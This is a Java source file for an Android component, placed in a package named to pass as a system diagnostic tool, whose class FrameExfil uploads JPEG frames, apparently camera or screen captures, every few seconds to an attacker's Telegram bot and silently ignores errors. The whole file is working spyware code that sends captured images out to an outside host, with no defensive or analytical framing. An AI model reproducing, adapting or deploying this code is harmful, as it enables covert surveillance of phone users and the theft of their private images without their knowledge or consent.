package com.android.sysdiag;

import java.io.IOException;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class FrameExfil {

    private static final String BOT_TOKEN = BuildConfig.BOT_TOKEN;
    private static final String CHAT_ID   = BuildConfig.CHAT_ID;

    private static final long MIN_INTERVAL_MS = 3000L;

    private final OkHttpClient client = new OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build();

    private final AtomicLong lastSent = new AtomicLong(0);
    private final AtomicLong counter = new AtomicLong(0);

    public void send(byte[] jpeg) {
        long now = System.currentTimeMillis();
        long prev = lastSent.get();
        if (now - prev < MIN_INTERVAL_MS) return;
        if (!lastSent.compareAndSet(prev, now)) return;

        try {
            RequestBody fileBody = RequestBody.create(
                jpeg, MediaType.parse("image/jpeg")
            );

            MultipartBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart(
                    "photo",
                    "frame_" + counter.incrementAndGet() + ".jpg",
                    fileBody
                )
                .addFormDataPart(
                    "caption",
                    "f#" + counter.get() + " " + System.currentTimeMillis()
                )
                .build();

            Request req = new Request.Builder()
                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
                .post(body)
                .build();

            try (Response r = client.newCall(req).execute()) {
            }
        } catch (IOException ignored) {
        }
    }
}
